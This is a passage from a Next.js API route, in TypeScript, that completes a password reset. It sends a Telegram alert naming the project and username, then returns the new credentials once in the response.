  if (!result) {
    return NextResponse.json({ status: "error", message: "Reset failed" }, { status: 500 });
  }

  void sendTelegramNotification({
    projectId: project.id,
    message:
      `🔑 Password Reset\n` +
      `project: <code>${project.id}</code>\n` +
      `name: <b>${project.name}</b>\n` +
      `username: <code>${project.username}</code>`,
  });

  // Return new credentials once — not retrievable again
  return NextResponse.json({
    status: "ok",
    credentials: {
      username: project.username,
      password: result.plaintextPassword,
    },
  });
}
```
